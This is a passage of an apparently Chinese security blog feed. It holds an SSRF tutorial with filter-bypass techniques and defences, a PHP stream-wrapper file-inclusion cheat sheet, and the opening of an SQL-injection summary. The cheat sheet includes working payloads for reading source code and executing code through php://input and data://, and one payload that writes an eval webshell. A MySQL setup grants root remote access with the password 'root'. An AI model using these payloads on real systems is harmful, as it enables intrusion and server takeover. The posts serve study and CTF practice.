mysql.user</code>查看默认的连接方式。</li><li>如果是<code>unix_socket</code>(MariaDB)，则继续下面得步骤。</li><li>退出mysql，并kill掉进程。</li><li>打开<code>mysqld_safe --skip-grant-tables</code>放入后台，并进入<code>mysql</code>。</li><li><code>update mysql.user set authentication_string = password('root'), plugin = 'mysql_native_password' where user = 'root';</code>。</li><li><code>flush privileges;</code>应用权限。</li><li>修改<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code>中的<code>bind-address</code>为允许的网络地址，若为整个网络则填入<code>0.0.0.0</code>或注释掉</li><li>重启服务</li><li>退出并重启MySQL。</li></ol><p><strong>为MySQL添加远程访问</strong></p><ol><li>修改<code>/etc/mysql/mysql.conf.d/mysqld.cnf``/etc/mysql/my.cnf</code>中的<code>bind-address</code>为允许的网络地址，若为整个网络则填入<code>0.0.0.0</code>或注释掉</li><li>重启服务</li><li>启动mysql，输入<code>use mysql;</code>进入mysql表</li><li>修改地址<code>grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;</code>允许root用户远程使用root为密码连接。</li><li>使修改生效<code>flush privileges;</code></li><li>退出MySQL。</li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The SSRF</title>
      <link href="/2020/11/10/2020-11-10-ssrf-fu-wu-duan-qing-qiu-wei-zao/"/>
      <url>/2020/11/10/2020-11-10-ssrf-fu-wu-duan-qing-qiu-wei-zao/</url>
      
        <content type="html"><![CDATA[<h1 id="服务端请求伪造攻击"><a href="#服务端请求伪造攻击" class="headerlink" title="服务端请求伪造攻击"></a>服务端请求伪造攻击</h1><h1 id="0x00原理"><a href="#0x00原理" class="headerlink" title="0x00原理"></a>0x00原理</h1><p>一般的请求：客户端发起请求，服务器响应。</p><p>另外一种请求：客户端发起请求（向服务端提供一个URL），服务端向客户端提供的URL发起请求，然后把获得的响应内容返回给客户端。如：</p><p><img src="https:////upload-images.jianshu.io/upload_images/8531973-2129ae23303f3bff.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/690/format/webp" alt="img"></p><p>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等，就可能存在这种服务端请求伪造的缺陷。Google,Facebook,Adobe,baidu,tencent等知名公司都被发现过这种漏洞。</p><h1 id="0x01危害"><a href="#0x01危害" class="headerlink" title="0x01危害"></a>0x01危害</h1><p>攻击者利用ssrf可以实现的攻击主要有5种：</p><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。</p><p>常用的利用思路：</p><p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;Payload Result</p><p>1.内网探测: 内网主机信息收集</p><p>2.应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)</p><p>3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)</p><p>4.Payload Result: 返回相应Payload的执行信息</p><p>为什么通过http协议访问可以同其它协议的端口进行数据交互呢？</p><p>跨协议通信技术利用：<a href="http://www.freebuf.com/articles/web/19622.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/19622.html</a></p><h1 id="0x02漏洞挖掘"><a href="#0x02漏洞挖掘" class="headerlink" title="0x02漏洞挖掘"></a>0x02漏洞挖掘</h1><p>一切从客户端提交的含有URL的参数都可能存在SSRF漏洞。</p><h4 id="常见存在漏洞的场景如下："><a href="#常见存在漏洞的场景如下：" class="headerlink" title="常见存在漏洞的场景如下："></a>常见存在漏洞的场景如下：</h4><p>1、分享功能：通过URL地址分享网页内容。</p><p>2、在线转码服务：把网页内容（URL）在线转码为适合手机浏览的样式。</p><p>3、在线翻译：通过URL地址翻译对应文本内容。</p><p>4、远程图片加载、下载：通过URL加载图片或者下载图片。如：<a href="http://www.example.com/picture?url=http://image.example.com/1.jpg" target="_blank" rel="noopener">http://www.example.com/picture?url=http://image.example.com/1.jpg</a></p><p>5、图片、文章收藏功能：类似于场景1，通过URL收藏到在线收藏夹</p><p>6、未公开的api实现以及其他调用URL的功能：此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p><h4 id="常见的存在漏洞的参数："><a href="#常见的存在漏洞的参数：" class="headerlink" title="常见的存在漏洞的参数："></a>常见的存在漏洞的参数：</h4><p>share、wap、url、link、、src、source、target、u、3g、display、sourceURl、imageURL、domain…</p><p>可以结合google语法及上述关键字进行搜索验证。</p><h4 id="常见的容易出问题的函数："><a href="#常见的容易出问题的函数：" class="headerlink" title="常见的容易出问题的函数："></a>常见的容易出问题的函数：</h4><p>PHP : file_get_contents()、fsockopen()、curl_exec()</p><p>JAVA : Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类</p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>1、排除法</p><p>确认目标参数中的URL请求是从客户端发起还是从服务端发起的。</p><p>如：<a href="https://link.jianshu.com?t=http://www.douban.com/" target="_blank" rel="noopener">http://www.douban.com/</a>***/service?image=<a href="https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png</a></p><p><strong>排除法一：</strong></p><p>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<a href="http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p><p><strong>排除法二：</strong></p><p>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p><p><img src="https:////upload-images.jianshu.io/upload_images/8531973-d42d493011d35ee5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/826/format/webp" alt="img"></p><p>2、实例验证</p><p>首先要进行信息收集，以获得目标内网地址，收集途径：</p><p>a.敏感信息泄露</p><p>b.漏洞平台历史信息中存在目标内网信息</p><p>c.通过二级域名等暴力猜解工具模糊猜测内网地址</p><p>收集到内网地址后，就可以进行实例验证，是否可以请求内网地址、端口、资源等。</p><p>批量验证某个ip地址段端口开放情况可以用burp的爆破功能或者自己写py脚本。</p><h1 id="0x03绕过方法"><a href="#0x03绕过方法" class="headerlink" title="0x03绕过方法"></a>0x03绕过方法</h1><p>下文出现的192.168.0.1，10.0.0.1全部为服务器端的内网地址。</p><p><strong>1、更改IP\</strong>地址写法****</p><p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p><p>^10(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</p><p>^172.([1][6-9]|[2]\d|3[01])(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</p><p>^192.168(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</p><p>对于这种过滤我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址我们可以改写成：</p><p>(1)、8进制格式：0300.0250.0.1</p><p>(2)、16进制格式：0xC0.0xA8.0.1</p><p>(3)、10进制整数格式：3232235521</p><p>(4)、16进制整数格式：0xC0A80001</p><p>还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1</p><p><strong>2**</strong>、利用解析<strong><strong>URL</strong></strong>所出现的问题**</p><p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p><p><a href="https://link.jianshu.com?t=http://192.168.0.1/" target="_blank" rel="noopener">http://www.baidu.com@192.168.0.1/</a></p><p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<a href="https://link.jianshu.com?t=http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为<a href="https://link.jianshu.com?t=http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</p><p><strong>3**</strong>、利用<strong><strong>302</strong></strong>跳转**</p><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。</p><p>(1)、在网络上存在一个很神奇的服务，<a href="https://link.jianshu.com?t=http://xip.io/" target="_blank" rel="noopener">http://xip.io</a>当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</p><p>(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是<a href="https://link.jianshu.com?t=http://tinyurl.com/" target="_blank" rel="noopener">http://tinyurl.com</a>所提供的短地址服务，如下图所示：</p><p><img src="https:////upload-images.jianshu.io/upload_images/8531973-3a434cd0d2b841c8.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/481/format/webp" alt="img"></p><p>同样的，我们也可以自行写一个跳转的服务接口来实现类似的功能。</p><p><strong>4**</strong>、通过各种非<strong><strong>HTTP</strong></strong>协议：**</p><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p><p>(1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p><p><img src="https:////upload-images.jianshu.io/upload_images/8531973-523da0932affc6a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/837/format/webp" alt="img"></p><p>(2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容</p><p>(3)、DICT协议</p><p><a href=""><strong>5</strong></a><strong>、**</strong>DNS Rebinding**</p><p>对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：</p><p><img src="https:////upload-images.jianshu.io/upload_images/8531973-eed69aa1281f3db2.png!small?imageMogr2/auto-orient/strip%7CimageView2/2/w/624/format/webp" alt="img"></p><p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p><p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p><p>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</p><p>(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证</p><p>(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</p><p>(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p><h1 id="0x04实战案例"><a href="#0x04实战案例" class="headerlink" title="0x04实战案例"></a>0x04实战案例</h1><p>wooyun漏洞库案例</p><p>weblogic的uddiexplorer，这个好像比较常见一些</p><p>其它待收集补充</p><h1 id="0x05防御思路"><a href="#0x05防御思路" class="headerlink" title="0x05防御思路"></a>0x05防御思路</h1><p>通常有以下5个思路：</p><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p><p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p><p>6、禁止302跳转</p><p>7、使用gethostbyname（）判断请求是否为内网ip。 要结合6来使用</p><p>其中3、4、5可以通过网络防火墙或者主机防火墙来实现。</p><h1 id="0x06参考"><a href="#0x06参考" class="headerlink" title="0x06参考"></a>0x06参考</h1><p>SSRF攻击实例解析：<a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/20407.html</a></p><p>SSRF漏洞的挖掘经验：<a href="http://bobao.360.cn/learning/detail/240.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/240.html</a></p><p>跨协议通信技术利用：<a href="http://www.freebuf.com/articles/web/19622.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/19622.html</a></p><p>关于SSRF攻击：<a href="http://evilcos.me/?p=221" target="_blank" rel="noopener">http://evilcos.me/?p=221</a> </p><p>SSRF的新纪元：在编程语言中利用URL解析器：<a href="http://bobao.360.cn/learning/detail/4183.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4183.html</a></p><p>作者：0x525c<br>链接：<a href="https://www.jianshu.com/p/10ec9bd3fa0a" target="_blank" rel="noopener">https://www.jianshu.com/p/10ec9bd3fa0a</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 伪协议</title>
      <link href="/2020/11/08/2020-11-08-php-wei-xie-yi/"/>
      <url>/2020/11/08/2020-11-08-php-wei-xie-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><pre><code>/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\path\to\winfile.ext\\smbserver\share\path\to\winfile.extfile:///path/to/file.ext</code></pre></li><li><p><strong>示例</strong>：</p><ol><li><p><code>file://[文件的绝对路径和文件名]</code></p><pre><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQAZ" alt="图片描述"></p></li><li><p><code>[文件的相对路径和文件名]</code></p><pre><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQA1" alt="图片描述"></p></li><li><p><code>[http：//网络路径和文件名]</code></p><pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQBb" alt="图片描述"></p></li></ol></li><li><p><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.file.php</a></p></li></ul><h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li></ul></li><li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype="multipart/form-data"</code> 的时候<code>php://input</code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table></li><li><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php://filter 参数</th><th>描述</th><th></th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td><td>*）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td><td>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table></li><li><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table></li><li><p><strong>示例</strong>：</p><ol><li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></pre><p><img src="https://segmentfault.com/img/bVbrQBf" alt="图片描述"></p></li><li><p><code>php://input + [POST DATA]</code>执行php代码</p><pre><code>http://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php phpinfo(); ?&gt;</code></pre><p><img src="https://segmentfault.com/img/bVbrQBh" alt="图片描述"></p><p>若有写入权限，写入一句话木马</p><pre><code>http://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;</code></pre><p><img src="https://segmentfault.com/img/bVbrQBi" alt="图片描述"></p></li></ol></li><li><p><strong>参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://php.net/manual/zh/wrappers.php.php</a></p></li></ul><h2 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p><ol><li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p><p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p><pre><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQBj" alt="图片描述"></p></li><li><p><code>compress.bzip2://file.bz2</code></p><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><pre><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre><p><img src="https://segmentfault.com/img/bVbrQBt" alt="图片描述"></p></li><li><p><code>compress.zlib://file.gz</code></p><p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><pre><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre><p><img src="https://segmentfault.com/img/bVbrQBu" alt="图片描述"></p></li></ol></li><li><p><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a></p></li></ul><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><pre><code>data://text/plain,data://text/plain;base64,</code></pre></li><li><p><strong>示例</strong>：</p><ol><li><p><code>data://text/plain,</code></p><pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><p><img src="https://segmentfault.com/img/bVbrQBB" alt="图片描述"></p></li><li><p><code>data://text/plain;base64,</code></p><pre><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p><img src="https://segmentfault.com/img/bVbrQBD" alt="图片描述"></p></li></ol></li></ul><h2 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><code>http:// &amp; https://</code> 协议</h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><pre><code>http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com</code></pre></li><li><p><strong>示例</strong>：</p><pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQBP" alt="图片描述"></p></li></ul><h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> 协议</h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQBX" alt="图片描述"></p><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><p>参考文章：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结</title>
      <link href="/2020/10/14/2020-10-14-sql-zhu-ru-zong-jie-chi-xu-geng-xin/"/>
      <url>/2020/10/14/2020-10-14-sql-zhu-ru-zong-jie-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入总结（持续更新）"><a href="#SQL注入总结（持续更新）" class="headerlink" title="SQL注入总结（持续更新）"></a>SQL注入总结（持续更新）</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。</p><p>由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型</p><blockquote><p>按照注入点类型来分类</p></blockquote><h3 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1" target="_blank" rel="noopener">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p><p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p><h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin" target="_blank" rel="noopener">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code> 